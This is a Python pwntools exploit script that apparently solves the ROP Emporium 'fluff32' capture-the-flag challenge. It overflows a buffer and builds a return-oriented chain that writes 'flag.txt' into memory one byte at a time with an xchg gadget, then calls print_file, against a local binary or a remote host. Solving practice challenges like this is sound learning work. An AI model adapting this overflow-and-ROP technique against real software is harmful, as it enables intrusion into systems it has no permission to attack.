from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./fluff32")


class ROPS:
    xchg       = 0x08048555 # xchg byte ptr [ecx], dl; ret
    popal      = 0x08048527 # EDI, ESI, EBP, ESP, EBX, EDX, ECX, and EAX
    data_start = 0x0804a018
    ret        = 0x08048382


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)


def generate_payload(padlen, string):
    """ Generates payload specific to this challenge """
    payload = [ cyclic(padlen) ]
    count = 0
    for char in string:
        add_char_chain = [
            ROPS.popal,
            0,                       # EDI
            1,                       # ESI
            2,                       # EBP
            3,                       # ESP
            4,                       # EBX
            ord(char),               # EDX
            ROPS.data_start + count, # ECX
            7,                       # EAX
            ROPS.xchg,
        ]
        payload.extend(add_char_chain)
        count += 1
    payload.append(elf.plt.print_file)
    payload.append(ROPS.ret)
    payload.append(ROPS.data_start)
    return payload    


def solve():
    io = conn()

    input("PAUSE...")

    payload = generate_payload(44, "flag.txt")

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()